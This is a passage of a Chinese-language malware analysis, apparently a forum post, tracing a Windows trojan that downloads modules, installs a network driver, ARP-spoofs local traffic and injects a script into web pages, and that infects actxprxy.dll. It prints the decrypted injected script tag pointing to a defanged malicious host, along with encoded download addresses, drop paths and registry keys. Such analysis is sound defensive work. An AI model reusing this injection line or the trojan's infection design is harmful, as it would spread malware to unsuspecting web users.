
接着，解密获得地址：`42eK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4g2K6i4K6u0W2M7$3!0$3K9h3g2@1i4K6u0V1K9$3N6T1i4K6u0W2K9h3&6X3L8#2)9J5c8Y4k6Q4x3X3g2S2M7%4m8Q4x3U0M7`，通过 `61cK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4g2K6i4K6u0W2M7$3!0$3K9h3g2@1i4K6u0V1K9$3N6T1i4K6u0W2K9h3&6X3L8#2)9J5c8Y4k6Q4x3X3g2S2M7%4m8Q4x3U0N6Q4x3@1k6S2j5%4c8A6L8$3&6Q4x3@1c8#2M7r3c8S2N6r3g2Q4x3U0k6$3k6i4u0K6K9h3!0F1i4K6y4p5x3l9` 调用，下载病毒，保存为 `\windows\AppPatch\AcXtrnel.sdb`，加载，并执行其中的模块：`DLPUpdate`。

病毒建立了注册表项 `HKEY_LOCAL_MACHINE, "Software\Adobe"`，用来保存木马清单。

2、大致是 `load \windows\AppPatch\AcXtrnel.sdb`，获得 `DLPTerminate`、`DLPInit`、`DLPTerminate`、`DLPUpdate` 模块地址。

## 六、`AcXtrnel.sdb`

2个主要模块：

1、`DLPInit`：

解密释放内嵌的代码，生成 `\windows\AppPatch\AcSpecf.dll`，加载，获得其中的 `FtpInit`、`FtpTerminate` 入口地址。

解密（XOR）得到地址：`28aK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3k6@1M7q4)9J5k6h3c8T1z5o6R3@1z5o6t1&6i4K6u0W2K9h3&6X3L8#2)9J5c8X3k6@1M7q4)9J5k6h3q4K6M7q4!0q4c8W2!0n7b7#2)9^5b7#2!0q4y4q4!0n7c8q4)9&6b7#2!0q4y4q4!0n7z5q4!0n7b7g2!0q4y4g2)9^5c8W2)9^5x3W2!0q4y4W2)9&6y4g2!0n7x3q4!0q4y4q4!0n7b7#2!0m8x3q4!0q4z5g2)9^5x3q4)9&6x3W2!0q4c8W2!0n7b7#2)9^5b7#2!0q4z5q4!0n7x3q4)9^5x3#2!0q4y4#2)9&6y4q4!0m8z5l9`，`FtpInit`。

解密释放内嵌代码，生成 `\windows\system32\drivers\eth8023.sys`，修改注册表，然后加载驱动！

读取注册表 `HKEY_LOCAL_MACHINE, "Software\Google"` 下的子项（由 `DLPUpdate` 写入的），发送 ARP 欺骗包，劫持 HTTP 通讯，在返回的正常页面里插入病毒网页！

3、`DLPUpdate`：

解密获得地址：`a33K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3y4K6M7#2)9J5k6h3c8T1z5o6R3@1z5o6t1&6i4K6u0W2K9h3&6X3L8#2)9J5c8X3y4K6M7#2)9J5k6i4c8^5N6q4)9J5y4#2)9J5y4X3&6T1M7%4m8Q4x3@1u0Q4x3U0k6F1j5Y4y4H3i4K6y4n7i4K6u0o6i4@1f1@1i4@1t1^5i4K6S2n7i4@1f1^5i4@1u0p5i4@1u0p5i4@1g2r3i4@1u0o6i4K6S2o6i4@1f1^5i4@1u0r3i4K6V1&6i4@1f1$3i4K6V1^5i4@1q4r3i4@1f1@1i4@1t1^5i4@1q4m8i4@1f1@1i4@1u0m8i4K6S2o6i4@1f1^5i4@1u0r3i4K6W2n7i4@1f1#2i4K6R3^5i4@1t1$3i4@1f1$3i4K6V1$3i4K6R3%4i4@1f1@1i4@1u0n7i4@1t1$3i4@1g2r3i4@1u0o6i4K6S2o6i4@1f1#2i4K6R3&6i4K6S2p5y4q4!0q4y4g2!0m8c8q4)9&6y4#2!0q4z5q4)9^5b7g2)9^5x3W2!0q4y4W2)9&6y4W2)9^5y4#2!0q4y4q4!0n7b7W2!0n7y4W2!0q4y4W2!0m8x3q4)9^5y4#2!0q4y4g2!0n7c8W2)9&6y4#2!0q4c8W2!0n7b7#2)9&6b7g2)9J5x3f1u0q4N6R3`，2字节 `00`，之后为 XOR 加密的网马内容。

解密后为：

```html
<script language="javascript" SRC="hxxp://y.ads009.info/vip.js"></script>
```

![](https://bbs.kanxue.com/view/img/face/12.gif)（为免误伤，我把 `http` 改成 `hxxp`。）

病毒校验文件头后把其后的数据写入注册表供 ARP 攻击使用。

可惜的是 `y.ads009.info` 似乎死了，没法看是否有利用 `ms08-67` 的网马。![](https://bbs.kanxue.com/view/img/face/50.gif)

在以前分析的案例里，`.js` 指向一个 `.htm`，再连接 `n` 个网页，利用 `falshplayer`、`MS06-014`、`realplay`、联众游戏大厅、暴风影音等漏洞，下载木马，该木马是 `update.gif` 复本。

## 七、`AcSpecf.dll`

vmware 卸了，木抓到样本。印象中主要实现 3 个模块功能：`FtpInit` / `FtpSend` / `FtpTerminate`。

## 八、`034.cab`

...

1、读取 `\windows\system32\actxprxy.dll`，检测是否已中毒，标志为文件起始偏移 `14H` 字节是否为 `315h`，偏移 `16H` 是否为 `1011h`，未感染则解读 `actxprxy.dll`，保存程序入口代码，修改程序入口代码，在程序空隙插入病毒代码，使得程序先执行病毒代码再执行原代码，程序文件大小、日期均不改变。以目前的代码看，可以利用 `315H` 和 `1011H` 4 字节实现该病毒的免疫。

2、释放文件 `ThunderAdvise.dll` 到 `\windows\Downloaded Program Files\`，修改注册表实现自启动。

3、后释放 `uninstall.bat` 删除自己。

## 九、`n个.cab`

... 累死了 ![](https://bbs.kanxue.com/view/img/face/50.gif)

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)
